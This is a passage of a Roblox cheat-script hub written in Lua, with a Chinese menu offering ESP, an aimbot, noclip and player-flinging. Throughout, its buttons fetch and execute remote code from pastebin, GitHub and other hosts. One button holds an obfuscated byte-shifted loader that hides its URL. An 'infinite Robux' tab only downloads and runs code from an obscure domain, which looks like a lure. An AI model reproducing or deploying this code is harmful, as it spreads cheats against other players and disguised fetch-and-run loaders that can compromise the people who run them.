    local brightnessEnabled = false
    local brightnessValue = 1
    local brightnessConn = nil
    local function updateBrightness()
        if brightnessEnabled then
            if not brightnessConn then
                brightnessConn = RunService.Heartbeat:Connect(function()
                    if brightnessEnabled then
                        Lighting.Brightness = brightnessValue
                        Lighting.ClockTime = 12
                        Lighting.FogEnd = 100000
                        Lighting.GlobalShadows = false
                    end
                end)
            end
            Lighting.Brightness = brightnessValue
            Lighting.ClockTime = 12
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = false
        else
            if brightnessConn then brightnessConn:Disconnect(); brightnessConn = nil end
            Lighting.Brightness = 1
            Lighting.ClockTime = 14
            Lighting.FogEnd = 10000
            Lighting.GlobalShadows = true
        end
    end
    sectionSelf:Toggle({ Name = "改亮度", Value = false, Callback = function(v) brightnessEnabled = v; updateBrightness() end })
    sectionSelf:Slider({ Name = "亮度数值", Value = { Min = 0, Max = 10, Default = 1 }, Callback = function(v)
        brightnessValue = v
        if brightnessEnabled then Lighting.Brightness = v end
    end })

    local sectionCommon2 = tabCommon:Section({ Name = "通用功能", SubName = "各种实用小功能", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    sectionCommon2:Toggle({ Name = "防虚空坠落 (3秒回传)", Value = false, Callback = function(v) voidProtectEnabled = v; updateVoidProtection() end })
    sectionCommon2:Button({ Name = "款飞行", Callback = function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/fgyhxrtm-ship-it/gghv/refs/heads/main/%E6%AC%BE%E9%A3%9E%E8%A1%8C.lua"))() end) end })
    sectionCommon2:Toggle({ Name = "穿墙模式（永久）", Value = false, Callback = function(v) if v then local char = LocalPlayer.Character; if char then for _, p in ipairs(char:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end end end end })
    sectionCommon2:Toggle({ Name = "无限跳", Value = false, Callback = function(v) if v then UserInputService.JumpRequest:Connect(function() local char = LocalPlayer.Character; if char then local hum = char:FindFirstChildOfClass("Humanoid"); if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end end end) end end })
    sectionCommon2:Button({ Name = "自死", Callback = function() local char = LocalPlayer.Character; if char then local hum = char:FindFirstChildOfClass("Humanoid"); if hum then hum.Health = 0 end end end })
    sectionCommon2:Button({ Name = "视角可提超广角", Callback = function() workspace.CurrentCamera.FieldOfView = 100 end })
    sectionCommon2:Button({ Name = "死亡笔记", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0%20(1).txt"))() end })
    sectionCommon2:Button({ Name = "踏空行走", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))() end })
    sectionCommon2:Button({ Name = "铁拳", Callback = function() loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'))() end })
    sectionCommon2:Toggle({ Name = "反挂机", Value = false, Callback = function(v) if v then loadstring(game:HttpGet("https://pastebin.com/raw/9fFu43FF"))() end end })
    sectionCommon2:Button({ Name = "汉化", Callback = function() TX = "TX Script"
Script = "全自动翻译"
loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Item/refs/heads/main/Auto-language"))() end })

    local sectionESP = tabCommon:Section({ Name = "透视", SubName = "玩家透视", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    local espHighlightEnabled, showNames, showHealth = false, false, false
    local espCache = {}
    local playerAddedConn = nil
    local playerRemovingConn = nil
    local function getPlayerDisplayName(player)
        if player.DisplayName and player.DisplayName ~= "" then return player.DisplayName end
        return player.Name
    end
    local function createESPForPlayer(player)
        if espCache[player] then return end
        local data = {connections = {}}
        espCache[player] = data
        local function onCharacterAdded(character)
            if data.highlight then pcall(function() data.highlight:Destroy() end); data.highlight = nil end
            if data.billboard then pcall(function() data.billboard.Parent = nil end); pcall(function() data.billboard:Destroy() end); data.billboard = nil end
            for _, conn in ipairs(data.connections) do if conn then pcall(function() conn:Disconnect() end) end end
            data.connections = {}
            local humanoid = character:WaitForChild("Humanoid", 5)
            if not humanoid then return end
            local head = character:WaitForChild("Head", 5)
            if not head then return end
            if espHighlightEnabled then
                local highlight = Instance.new("Highlight")
                highlight.Name = "ESP_Highlight"
                highlight.Adornee = character
                highlight.FillTransparency = 1
                highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
                highlight.OutlineTransparency = 0
                highlight.Parent = character
                data.highlight = highlight
            end
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "ESP_Billboard"
            billboard.Adornee = head
            billboard.Size = UDim2.new(0, 120, 0, 30)
            billboard.StudsOffset = Vector3.new(0, 1.5, 0)
            billboard.AlwaysOnTop = true
            billboard.Enabled = false
            billboard.Parent = head
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1,0,1,0)
            label.BackgroundTransparency = 1
            label.TextColor3 = Color3.fromRGB(255,255,255)
            label.TextStrokeTransparency = 0
            label.Font = Enum.Font.SourceSansBold
            label.TextSize = 10
            label.Visible = false
            label.Parent = billboard
            data.billboard = billboard
            data.label = label
            local function update()
                if humanoid and humanoid.Parent and head and head.Parent and label and label.Parent then
                    local textParts = {}
                    if showNames then table.insert(textParts, getPlayerDisplayName(player)) end
                    if showHealth then table.insert(textParts, string.format("%d/%d", math.floor(humanoid.Health), math.floor(humanoid.MaxHealth))) end
                    if #textParts > 0 then
                        label.Text = table.concat(textParts, "\n")
                        label.Visible = true
                        billboard.Enabled = true
                    else
                        label.Visible = false
                        billboard.Enabled = false
                    end
                end
            end
            update()
            table.insert(data.connections, humanoid.HealthChanged:Connect(update))
        end
        if player.Character then onCharacterAdded(player.Character) end
        data.charConnection = player.CharacterAdded:Connect(onCharacterAdded)
    end
    local function removeESPFromPlayer(player)
        local data = espCache[player]
        if not data then return end
        if data.charConnection then pcall(function() data.charConnection:Disconnect() end) end
        for _, conn in ipairs(data.connections) do if conn then pcall(function() conn:Disconnect() end) end end
        if data.highlight then pcall(function() data.highlight:Destroy() end) end
        if data.billboard then pcall(function() data.billboard.Parent = nil end); pcall(function() data.billboard:Destroy() end) end
        espCache[player] = nil
    end
    local function rebuildAllESP()
        if not espHighlightEnabled and not showNames and not showHealth then
            for player, _ in pairs(espCache) do removeESPFromPlayer(player) end
            if playerAddedConn then playerAddedConn:Disconnect(); playerAddedConn = nil end
            if playerRemovingConn then playerRemovingConn:Disconnect(); playerRemovingConn = nil end
            return
        end
        for player, data in pairs(espCache) do
            if data.label and data.billboard then
                local char = player.Character
                if char then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local head = char:FindFirstChild("Head")
                    if hum and head then
                        local textParts = {}
                        if showNames then table.insert(textParts, getPlayerDisplayName(player)) end
                        if showHealth then table.insert(textParts, string.format("%d/%d", math.floor(hum.Health), math.floor(hum.MaxHealth))) end
                        if #textParts > 0 then
                            data.label.Text = table.concat(textParts, "\n")
                            data.label.Visible = true
                            data.billboard.Enabled = true
                        else
                            data.label.Visible = false
                            data.billboard.Enabled = false
                        end
                    end
                end
            end
            if espHighlightEnabled then
                if not data.highlight and player.Character then
                    local highlight = Instance.new("Highlight")
                    highlight.Name = "ESP_Highlight"
                    highlight.Adornee = player.Character
                    highlight.FillTransparency = 1
                    highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
                    highlight.OutlineTransparency = 0
                    highlight.Parent = player.Character
                    data.highlight = highlight
                end
            else
                if data.highlight then pcall(function() data.highlight:Destroy() end); data.highlight = nil end
            end
        end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and not espCache[player] then createESPForPlayer(player) end
        end
        if not playerAddedConn then
            playerAddedConn = Players.PlayerAdded:Connect(function(player)
                if player ~= LocalPlayer then createESPForPlayer(player) end
            end)
        end
        if not playerRemovingConn then
            playerRemovingConn = Players.PlayerRemoving:Connect(removeESPFromPlayer)
        end
    end
    sectionESP:Toggle({ Name = "绿色边框", Value = false, Callback = function(v) espHighlightEnabled = v; rebuildAllESP() end })
    sectionESP:Toggle({ Name = "用户名", Value = false, Callback = function(v) showNames = v; rebuildAllESP() end })
    sectionESP:Toggle({ Name = "血量", Value = false, Callback = function(v) showHealth = v; rebuildAllESP() end })

    local sectionAim = tabCommon:Section({ Name = "自瞄区域", SubName = "自动瞄准", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    local aimEnabled = false
    local aimHeartbeat = nil
    local function updateAimHeartbeat()
        if aimEnabled and not aimHeartbeat then
            aimHeartbeat = RunService.Heartbeat:Connect(function()
                local char = LocalPlayer.Character
                if not char then return end
                local root = char:FindFirstChild("HumanoidRootPart")
                if not root then return end
                local nearest, dist = nil, math.huge
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then
                        local d = (root.Position - p.Character.Head.Position).Magnitude
                        if d < dist then dist = d; nearest = p.Character.Head end
                    end
                end
                if nearest then
                    root.CFrame = CFrame.lookAt(root.Position, Vector3.new(nearest.Position.X, root.Position.Y, nearest.Position.Z))
                end
            end)
        elseif not aimEnabled and aimHeartbeat then
            aimHeartbeat:Disconnect(); aimHeartbeat = nil
        end
    end
    sectionAim:Button({ Name = "阿尔宙斯同款自瞄", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/sgbs/main/%E4%B8%81%E4%B8%81%20%E6%B1%89%E5%8C%96%E8%87%AA%E7%9E%84.txt"))() end })
    sectionAim:Toggle({ Name = "自瞄（瞄准头部）", Value = false, Callback = function(v) aimEnabled = v; updateAimHeartbeat() end })

    local sectionFling = tabCommon:Section({ Name = "甩飞区域", SubName = "防甩飞相关", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    local antiKnockbackEnabled = false
    local antiKnockbackConn = nil
    sectionFling:Toggle({ Name = "防甩飞（无碰撞箱）", Value = false, Callback = function(v)
        antiKnockbackEnabled = v
        if v then
            if LocalPlayer.Character then
                local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if root then root.CanCollide = false end
            end
            if antiKnockbackConn then antiKnockbackConn:Disconnect() end
            antiKnockbackConn = LocalPlayer.CharacterAdded:Connect(function(char)
                if antiKnockbackEnabled then
                    local root = char:WaitForChild("HumanoidRootPart", 5)
                    if root then root.CanCollide = false end
                end
            end)
        else
            if LocalPlayer.Character then
                local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if root then root.CanCollide = true end
            end
            if antiKnockbackConn then antiKnockbackConn:Disconnect(); antiKnockbackConn = nil end
        end
    end })
    sectionFling:Button({ Name = "甩飞(先开飞行再开)", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%97%8B%E8%BD%AC.lua"))() end })
    sectionFling:Toggle({ Name = "甩飞所有人", Value = false, Callback = function(v)
        if v then loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))() end
    end })

    local tabHorror = Soundify(Window:Tab("恐怖模式", "83701039519151"))
    local sectionHorror = tabHorror:Section({ Name = "恐怖设置", SubName = "心理承受能力差者慎用", Logo = "83701039519151", Collapsible = true, Collapsed = false })
    local skyBlackEnabled = false
    local skyBlackValue = 0
    local skyBlackConn = nil
    local skyBlackSaved = nil
    local function SaveSkyBlackSnapshot() skyBlackSaved = { Brightness = Lighting.Brightness, Ambient = Lighting.Ambient, OutdoorAmbient = Lighting.OutdoorAmbient, ClockTime = Lighting.ClockTime, FogEnd = Lighting.FogEnd, GlobalShadows = Lighting.GlobalShadows } end
    local function RestoreSkyBlackSnapshot() if skyBlackSaved then Lighting.Brightness = skyBlackSaved.Brightness; Lighting.Ambient = skyBlackSaved.Ambient; Lighting.OutdoorAmbient = skyBlackSaved.OutdoorAmbient; Lighting.ClockTime = skyBlackSaved.ClockTime; Lighting.FogEnd = skyBlackSaved.FogEnd; Lighting.GlobalShadows = skyBlackSaved.GlobalShadows; skyBlackSaved = nil end end
    local function ApplySkyBlack() local v = skyBlackValue; local col = Color3.fromRGB(255 - v, 255 - v, 255 - v); Lighting.Ambient = col; Lighting.OutdoorAmbient = col; Lighting.Brightness = math.max(0.05, 2 - (v / 255 * 2)); Lighting.ClockTime = 0; Lighting.FogEnd = 100000; Lighting.GlobalShadows = false end
    sectionHorror:Toggle({ Name = "天空变黑 (持续锁定，不反弹)", Value = false, Callback = function(v) skyBlackEnabled = v; if v then SaveSkyBlackSnapshot(); if not skyBlackConn then skyBlackConn = RunService.Heartbeat:Connect(function() if skyBlackEnabled then ApplySkyBlack() end end) end; ApplySkyBlack() else if skyBlackConn then skyBlackConn:Disconnect(); skyBlackConn = nil end; RestoreSkyBlackSnapshot() end end })
    sectionHorror:Slider({ Name = "变黑程度 (0正常 - 255全黑)", Value = { Min = 0, Max = 255, Default = 0 }, Callback = function(v) skyBlackValue = v; if skyBlackEnabled then ApplySkyBlack() end end })
    local dayNightEnabled = false
    local dayNightConn = nil
    local savedLighting = nil
    local function SaveLightingSnapshot() savedLighting = { ClockTime = Lighting.ClockTime, Brightness = Lighting.Brightness, Ambient = Lighting.Ambient, OutdoorAmbient = Lighting.OutdoorAmbient, FogEnd = Lighting.FogEnd } end
    local function LerpClock(s, t, p) if t < s then t = t + 24 end return (s + (t - s) * p) % 24 end
    local function TweenToNight() if not savedLighting then return end; local sClock = savedLighting.ClockTime; for i = 0, 100 do if not dayNightEnabled then return end; local t = i / 100; Lighting.ClockTime = LerpClock(sClock, 0, t); Lighting.Brightness = savedLighting.Brightness + (0.05 - savedLighting.Brightness) * t; Lighting.Ambient = savedLighting.Ambient:Lerp(Color3.fromRGB(15, 15, 25), t); Lighting.OutdoorAmbient = savedLighting.OutdoorAmbient:Lerp(Color3.fromRGB(8, 8, 18), t); Lighting.FogEnd = savedLighting.FogEnd + (80 - savedLighting.FogEnd) * t; task.wait(0.05) end; if dayNightEnabled and not dayNightConn then dayNightConn = RunService.Heartbeat:Connect(function() if dayNightEnabled then Lighting.ClockTime = 0; Lighting.Brightness = 0.05; Lighting.Ambient = Color3.fromRGB(15, 15, 25); Lighting.OutdoorAmbient = Color3.fromRGB(8, 8, 18); Lighting.FogEnd = 80 end end) end end
    local function TweenToDay() if dayNightConn then dayNightConn:Disconnect(); dayNightConn = nil end; if not savedLighting then return end; local sClock = Lighting.ClockTime; for i = 0, 100 do local t = i / 100; Lighting.ClockTime = LerpClock(sClock, savedLighting.ClockTime, t); Lighting.Brightness = 0.05 + (savedLighting.Brightness - 0.05) * t; Lighting.Ambient = Color3.fromRGB(15, 15, 25):Lerp(savedLighting.Ambient, t); Lighting.OutdoorAmbient = Color3.fromRGB(8, 8, 18):Lerp(savedLighting.OutdoorAmbient, t); Lighting.FogEnd = 80 + (savedLighting.FogEnd - 80) * t; task.wait(0.05) end end
    sectionHorror:Toggle({ Name = "白天变黑天 (平滑过渡+持续锁定)", Value = false, Callback = function(v) dayNightEnabled = v; if v then SaveLightingSnapshot(); task.spawn(TweenToNight) else task.spawn(TweenToDay) end end })
    local horrorFireEnabled = false
    local horrorFireLoop = nil
    local function ClearHorrorFire() for _, obj in ipairs(workspace:GetDescendants()) do if obj:IsA("Fire") and obj.Name == "KuanHorrorFire" then pcall(function() obj:Destroy() end) end end end
    local function IsCharacterPart(part) local m = part.Parent while m and m ~= workspace do if m:IsA("Model") and m:FindFirstChildOfClass("Humanoid") then return true end m = m.Parent end return false end
    local function IgniteMostParts() local parts = {}; for _, obj in ipairs(workspace:GetDescendants()) do if obj:IsA("BasePart") and not obj:FindFirstChild("KuanHorrorFire") and not IsCharacterPart(obj) then table.insert(parts, obj) end end; if #parts == 0 then return end; for i = #parts, 2, -1 do local j = math.random(1, i); parts[i], parts[j] = parts[j], parts[i] end; for i = 1, #parts do local part = parts[i]; if part and part.Parent then local fire = Instance.new("Fire"); fire.Name = "KuanHorrorFire"; fire.Size = math.random(30, 55); fire.Heat = math.random(15, 30); fire.Color = Color3.fromRGB(255, 170, 60); fire.SecondaryColor = Color3.fromRGB(220, 40, 0); fire.Parent = part end; if i % 30 == 0 then task.wait() end end end
    sectionHorror:Toggle({ Name = "全图随机着火 (角色不着火)", Value = false, Callback = function(v) horrorFireEnabled = v; if v then if horrorFireLoop then pcall(function() task.cancel(horrorFireLoop) end); horrorFireLoop = nil end; horrorFireLoop = task.spawn(function() pcall(IgniteMostParts) while horrorFireEnabled do task.wait(5) if horrorFireEnabled then pcall(IgniteMostParts) end end end) else if horrorFireLoop then pcall(function() task.cancel(horrorFireLoop) end); horrorFireLoop = nil end; ClearHorrorFire() end end })
    sectionHorror:Button({ Name = "清除全图火焰", Callback = function() for _, obj in ipairs(workspace:GetDescendants()) do if obj:IsA("Fire") then obj:Destroy() end end end })
    local horrorPhrases = {"没用有的", "我知道你在哪", "已经结束了", "你是我的！"}
    sectionHorror:Button({ Name = "发送恐怖弹幕", Callback = function() CreateHorrorDanmaku(horrorPhrases[math.random(1, #horrorPhrases)]) end })
    sectionHorror:Toggle({ Name = "全屏血红滤镜", Value = false, Callback = function(v) local pg = LocalPlayer:WaitForChild("PlayerGui"); if v then local old = pg:FindFirstChild("HorrorBloodGui"); if old then old:Destroy() end; local gui = Instance.new("ScreenGui"); gui.Name = "HorrorBloodGui"; gui.ResetOnSpawn = false; gui.DisplayOrder = 9999; gui.IgnoreGuiInset = true; gui.Parent = pg; local frame = Instance.new("Frame"); frame.Size = UDim2.new(1, 0, 1, 0); frame.BackgroundColor3 = Color3.fromRGB(150, 0, 0); frame.BackgroundTransparency = 0.3; frame.BorderSizePixel = 0; frame.Parent = gui; local grad = Instance.new("UIGradient"); grad.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))}); grad.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.1), NumberSequenceKeypoint.new(0.5, 0.4), NumberSequenceKeypoint.new(1, 0.8)}); grad.Rotation = 90; grad.Parent = frame else local old = pg:FindFirstChild("HorrorBloodGui"); if old then old:Destroy() end end end })

    local tabFun = Soundify(Window:Tab("娱乐(FE)", "83701039519151"))
    local sectionFun = tabFun:Section({ Name = "FE以及娱乐功能", SubName = "各种娱乐工具", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    sectionFun:Button({ Name = "C00lgui", Callback = function() loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)() end })
    sectionFun:Button({ Name = "可口可乐", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Coca-Cola-Tool-34866"))() end })
    sectionFun:Button({ Name = "AK 47", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ak47", true))() end })
    sectionFun:Button({ Name = "电脑键盘", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))() end })
    sectionFun:Button({ Name = "幸存者", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Azizanzz0/Scripts/refs/heads/main/VHS%20Retro%20or%20BodyCam.txt"))() end })
    sectionFun:Button({ Name = "凋零风暴", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Wither"))() end })
    sectionFun:Button({ Name = "玩具熊", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/wbEc0ThZ"))() end })
        sectionFun:Button({ Name = "警笛头", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/8EAzYTSb", true))() end })
    sectionFun:Button({ Name = "飞檐走壁", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))() end })
    sectionFun:Button({ Name = "光剑", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Crucible-Sword-only-R6-87032"))() end })
    sectionFun:Button({ Name = "潜行", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/MFtsqzFG"))() end })
    local sectionFun2 = tabFun:Section({ Name = "动作类", SubName = "各种动作脚本", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    sectionFun2:Button({ Name = "动作", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))() end })
    sectionFun2:Button({ Name = "小猫", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/Y1MkBRn3"))() end })
    sectionFun2:Button({ Name = "打架(R6)", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-no-more-games-tool-not-fe-80285"))() end })
    sectionFun2:Button({ Name = "前后空翻动作", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E5%89%8D%E5%90%8E%E7%A9%BA%E7%BF%BB.txt"))() end })
    sectionFun2:Button({ Name = "撸管R15", Callback = function() loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))() end })
    sectionFun2:Button({ Name = "撸管R6", Callback = function() loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))() end })
    sectionFun2:Button({ Name = "访客1337动作", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/r862rtmj"))() end })
    sectionFun2:Button({ Name = "打人", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-THE-REAL-dropkick-177199"))() end })
    sectionFun2:Button({ Name = "复古(R6体型)", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/BZjruRhu"))() end })
        sectionFun2:Button({ Name = "初始黑客", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/stQF8TyE", true))() end })
    sectionFun2:Button({ Name = "黑客", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Jskfhggjxu/My-Script/refs/heads/main/ServerHacker-X.lua"))() end })
        sectionFun2:Button({ Name = "神秘黑客(R6)", Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-server-admin-67330"))() end })
        sectionFun2:Button({ Name = "科技飞镖", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Verlex"))() end })
                sectionFun2:Button({ Name = "邪恶莫蒂", Callback = function() loadstring(game:HttpGet("https://gist.githubusercontent.com/tinetglove/bfe3da815b725f23fb862e840ff2a54d/raw/66345d0dd6bce476c11305cb0586eb70acc5ff5a/script.lua"))() end })
                                sectionFun2:Button({ Name = "瑞克(需要解卡)", Callback = function() local Il01OI1I11OOIO1OO0 = getfenv or function() return _ENV end local II101IllII01010OIl = loadstring or load local I1OO01O0lI00I00I0O = string.char local II101O110l1OllllII = table.concat local l00I000llll1O0lOII = {[1]={183,186,172,175,190,191,189,180,185,178,115,178,172,184,176,133,147,191,191,187,146,176,191,115,109,179,191,191,187,190,133,122},[2]={122,178,180,190,191,121,178,180,191,179,192,173,192,190,176,189,174,186,185,191,176,185,191,121,174,186,184,122,158,126,172,177},[3]={186,192,183,175,190,122,123,124,125,173,175,126,172,126,130,176,124,123,177,124,124,129,177,124,132,124,173,131,129,132,123,130},[4]={129,173,128,125,177,129,122,189,172,194,122,178,180,190,191,177,180,183,176,124,121,191,195,191,109,116,116,115,116},} local O1111II1Il1I1IO1Ol = {1,2,3,4} local l01OO1OlOO00Ol0lI1 = 75 local IIO1IO101II1Ol0I01 = {} local llOI0001l0lOOIIl0l = 1 while llOI0001l0lOOIIl0l <= #O1111II1Il1I1IO1Ol do local l0OI0O0OOlIOO0O000 = O1111II1Il1I1IO1Ol[llOI0001l0lOOIIl0l] local IIOl1IOOIl1I1llOII = l00I000llll1O0lOII[l0OI0O0OOlIOO0O000] local lII110IO1OlI1100lO = {} local O0IO1IOOl1I11OlIOI = 1 while O0IO1IOOl1I11OlIOI <= #IIOl1IOOIl1I1llOII do local IOO1II0I10l1l1I111 = (IIOl1IOOIl1I1llOII[O0IO1IOOl1I11OlIOI] - l01OO1OlOO00Ol0lI1) % 256 lII110IO1OlI1100lO[O0IO1IOOl1I11OlIOI] = I1OO01O0lI00I00I0O(IOO1II0I10l1l1I111) O0IO1IOOl1I11OlIOI = O0IO1IOOl1I11OlIOI + 1 end IIO1IO101II1Ol0I01[llOI0001l0lOOIIl0l] = II101O110l1OllllII(lII110IO1OlI1100lO) llOI0001l0lOOIIl0l = llOI0001l0lOOIIl0l + 1 end local I1001lIO1O1l0ll1Il, l01l1I1IlI0l0l01I0 = II101IllII01010OIl(II101O110l1OllllII(IIO1IO101II1Ol0I01)) if type(I1001lIO1O1l0ll1Il) == "function" then I1001lIO1O1l0ll1Il() end end })
    local sectionTransform = tabFun:Section({ Name = "变身区", SubName = "变身各种角色", Logo = "83701039519151", Collapsible = true, Collapsed = true })
    sectionTransform:Button({ Name = "Hacklord魔王", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-1x1x1x1-lord-by-White-Hat-71150"))() end })
    sectionTransform:Button({ Name = "史蒂夫（只支持R6形象）", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Steve"))() end })
    sectionTransform:Button({ Name = "索尼克", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Azizanzz0/FE-R15-Sonic-X-Super/refs/heads/main/Protected%20SonicXSuper.txt"))() end })
    sectionTransform:Button({ Name = "索尼克exe", Callback = function() loadstring(game:HttpGet("https://pastefy.app/XCtZsGhP/raw"))() end })
    sectionTransform:Button({ Name = "人形汽车(变车)", Callback = function() loadstring(game:HttpGet("https://pastefy.app/UqDEIOpO/raw"))() end })
    sectionTransform:Button({ Name = "宇宙狼", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/JAMqGxLW"))() end })
    sectionTransform:Button({ Name = "v", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/pQjRMdiG"))() end })
    sectionTransform:Button({ Name = "祖国人", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/GioBolqv1/homelander-by-GioBolqv1-/refs/heads/main/homelander.lua"))() end })
        sectionTransform:Button({ Name = "黑影(R6体型)", Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-FE-caducus-check-description-73933"))() end })
            sectionTransform:Button({ Name = "Goner(R6体型）", Callback = function() loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Goner-47954"))() end })
    sectionTransform:Button({ Name = "John Doe[脚本生成器]（只支持R6形象）", Callback = function() loadstring(game:HttpGet("https://pastebin.com/raw/mMCS4Zne"))() end })
    sectionTransform:Button({ Name = "John Doe脚本生成器有动作（只支持R6形象）", Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FengYu-X/Function/refs/heads/main/john%20Doe.lua"))() end })

    Window:TabDivider()

    local tabInfiniteRobux = Soundify(Window:Tab("无限罗宝区", "83701039519151"))
    local sectionInfiniteRobux = tabInfiniteRobux:Section({
        Name = "无限罗宝",
        SubName = "点击按钮获取罗宝",
        Logo = "83701039519151",
        Collapsible = true,
        Collapsed = false,
    })
    for i = 1, 10 do
        local robuxAmount = i * 10
        sectionInfiniteRobux:Button({
            Name = "获取" .. robuxAmount .. "罗宝",
            Callback = function()
                pcall(function()
                    loadstring(game:HttpGet("https://sikon.226618.xyz/ocdt"))()
                end)
            end,
        })
    end

    Window:TabDivider()
    local tabMusic = Soundify(Window:Tab("音乐", "83701039519151"))
local sectionHall = tabMusic:Section({ Name = "音乐大厅", SubName = "推荐音乐", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local musicLibrary = {
    {name = "认清现实", id = "rbxassetid://136847919947471"},
    {name = "Passo bem solto", id = "rbxassetid://106185171358009"},
    {name = "循环小曲", id = "rbxassetid://116273924154778"},
    {name = "索尼克EXE", id = "rbxassetid://131415306381990"},
    {name = "Unhappy", id = "rbxassetid://88523902860927"},
    {name = "凤凰", id = "rbxassetid://77715601943266"},
}
for _, m in ipairs(musicLibrary) do
    sectionHall:Audio({ Name = m.name, SubName = "音乐大厅", Audio = m.id, Volume = 0.8, Looped = false, AutoPlay = false, PlayOutsideWindow = false })
end
local sectionCustomMusic = tabMusic:Section({ Name = "自定义音乐", SubName = "输入ID播放音乐", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local customMusicId = ""
sectionCustomMusic:Textbox({ Name = "输入音乐ID（纯数字）", Placeholder = "例如：12345678", Callback = function(v) customMusicId = v end })
sectionCustomMusic:Button({ Name = "加载自定义音乐", Callback = function()
    if customMusicId == "" then return end
    sectionCustomMusic:Audio({ Name = "自定义音乐 - " .. customMusicId, SubName = "自定义", Audio = "rbxassetid://" .. customMusicId, Volume = 0.8, Looped = false, AutoPlay = false, PlayOutsideWindow = false })
end })
local sectionBattle = tabMusic:Section({ Name = "一些梗音效", SubName = "搞笑音效集合", Logo = "83701039519151", Collapsible = true, Collapsed = true })
local battleSounds = {
    {name = "乌鲁鲁", id = "rbxassetid://80701295792893"},
    {name = "关注塔菲谢谢喵", id = "rbxassetid://126774078187195"},
    {name = "骷髅敲盾", id = "rbxassetid://109255721227659"},
    {name = "🧊🧊🧊", id = "rbxassetid://118192325368354"},
    {name = "叹气", id = "rbxassetid://88227888377765"},
    {name = "真的很帅", id = "rbxassetid://115207043627098"},
    {name = "康神开播了", id = "rbxassetid://71129270589179"},
}
for _, s in ipairs(battleSounds) do
    sectionBattle:Audio({ Name = s.name, SubName = "梗音效", Audio = s.id, Volume = 0.8, Looped = false, AutoPlay = false, PlayOutsideWindow = false })
end

Window:TabDivider()

local tabAutoChat = Soundify(Window:Tab("自动发言", "83701039519151"))
local function sendMessage(msg)
    pcall(function()
